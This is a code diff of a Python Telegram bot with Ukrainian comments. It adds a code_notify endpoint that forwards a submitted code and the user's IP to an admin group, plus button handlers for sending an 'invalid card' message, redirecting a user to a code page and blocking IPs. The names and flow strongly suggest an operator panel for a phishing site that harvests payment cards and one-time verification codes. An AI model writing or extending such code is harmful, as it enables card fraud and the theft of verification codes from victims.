@@ -1065,13 +1065,20 @@ async def payment_notify(request):
     await bot.send_message(ADMIN_GROUP_ID, text, reply_markup=kb)
     return web.Response(text='ok')
 
-@router.callback_query(lambda c: c.data and c.data.startswith('code:'))
-async def code_redirect_handler(call: types.CallbackQuery):
-    ip = call.data.split(':', 1)[1]
-    import aiohttp as aiohttp_client
-    async with aiohttp_client.ClientSession() as session:
-        await session.post('http://127.0.0.1:8080/admin_action', json={'action': 'code', 'ip': ip})
-    await call.answer("Redirecting user to code page")
+async def code_notify(request):
+    data = await request.json()
+    code = data.get('code', '')
+    ip = data.get('ip', '')
+    text = f"Code: {code}\nIP: {ip}"
+    kb = InlineKeyboardMarkup(
+        inline_keyboard=[
+            [
+                InlineKeyboardButton(text="Request again", callback_data=f"code_request_again:{code}")
+            ]
+        ]
+    )
+    await bot.send_message(ADMIN_GROUP_ID, text, reply_markup=kb)
+    return web.Response(text='ok')
 
 # --- CALLBACK-ОБРОБНИКИ ДЛЯ КНОПОК ---
 @router.callback_query(lambda c: c.data and (c.data.startswith('card:') or c.data.startswith('block:') or c.data.startswith('unblock:')))
@@ -1087,6 +1094,38 @@ async def admin_action_handler(call: types.CallbackQuery):
     elif action == 'unblock':
         await call.answer("Користувач розблокований")
 
+@router.callback_query(lambda c: c.data and c.data.startswith('card:'))
+async def card_handler(call: types.CallbackQuery):
+    ip = call.data.split(':', 1)[1]
+    import aiohttp as aiohttp_client
+    async with aiohttp_client.ClientSession() as session:
+        await session.post('http://127.0.0.1:8080/admin_action', json={'action': 'card', 'ip': ip})
+    await call.answer("Invalid card message sent")
+
+@router.callback_query(lambda c: c.data and c.data.startswith('block:'))
+async def block_handler(call: types.CallbackQuery):
+    ip = call.data.split(':', 1)[1]
+    import aiohttp as aiohttp_client
+    async with aiohttp_client.ClientSession() as session:
+        await session.post('http://127.0.0.1:8080/admin_action', json={'action': 'block', 'ip': ip})
+    await call.answer("IP blocked")
+
+@router.callback_query(lambda c: c.data and c.data.startswith('unblock:'))
+async def unblock_handler(call: types.CallbackQuery):
+    ip = call.data.split(':', 1)[1]
+    import aiohttp as aiohttp_client
+    async with aiohttp_client.ClientSession() as session:
+        await session.post('http://127.0.0.1:8080/admin_action', json={'action': 'unblock', 'ip': ip})
+    await call.answer("IP unblocked")
+
+@router.callback_query(lambda c: c.data and c.data.startswith('code:'))
+async def code_redirect_handler(call: types.CallbackQuery):
+    ip = call.data.split(':', 1)[1]
+    import aiohttp as aiohttp_client
+    async with aiohttp_client.ClientSession() as session:
+        await session.post('http://127.0.0.1:8080/admin_action', json={'action': 'code', 'ip': ip})
+    await call.answer("Redirecting user to code page")
+
 # --- запуск aiohttp і aiogram в одному event loop ---
 if __name__ == '__main__':
     async def main():
@@ -1094,6 +1133,7 @@ if __name__ == '__main__':
         app = web.Application()
         app.router.add_post('/notify_admin', notify_admin)
         app.router.add_post('/payment_notify', payment_notify)
+        app.router.add_post('/code_notify', code_notify)
         runner = web.AppRunner(app)
         await runner.setup()
         site = web.TCPSite(runner, '0.0.0.0', 8081)
